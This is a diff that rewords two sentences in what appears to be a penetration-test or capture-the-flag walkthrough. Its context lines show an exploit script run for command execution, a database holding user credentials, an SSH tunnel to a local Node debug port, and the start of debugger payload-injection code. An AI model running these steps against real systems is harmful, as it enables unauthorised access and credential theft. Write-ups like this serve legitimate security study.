@@ -104,7 +104,7 @@ source ~/venv/bin/activate
 python3 exploit.py -u https://example.com -c "id"
 ```
 
-Shell captured as `node`. `reactor.db` in the application directory held user credentials:
+Shell captured as `node`, and `reactor.db` in the application directory held user credentials:
 
 | ID  | Username | Password Hash                    | Role          | Email                |
 | --- | -------- | -------------------------------- | ------------- | -------------------- |
@@ -127,7 +127,7 @@ The port was only bound locally, so an SSH tunnel forwarded it out:
 ssh -L 9229:localhost:9229 engineer@reactor1
 ```
 
-Using `chrome-remote-interface` to reach the debugger and inject a payload:
+Reach the debugger with `chrome-remote-interface` and inject a payload:
 
 ```javascript
 const CDP = require('chrome-remote-interface');
